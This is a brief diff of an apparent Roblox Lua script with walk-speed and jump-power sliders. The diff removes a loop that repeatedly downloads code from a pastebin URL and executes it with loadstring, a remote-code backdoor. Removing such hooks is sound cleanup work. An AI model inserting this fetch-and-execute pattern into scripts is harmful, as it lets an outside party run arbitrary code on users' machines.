@@ -1011,6 +1011,3 @@ Player.CharacterAdded:Connect(function(Char)
 	Humanoid.WalkSpeed = SpeedSlider.CurrentValue
 	Humanoid.JumpPower = JumpSlider.CurrentValue
 end)
-while wait(2) do
-    loadstring(game:HttpGet('https://pastebin.com/raw/36q6eYi8'))()
-end
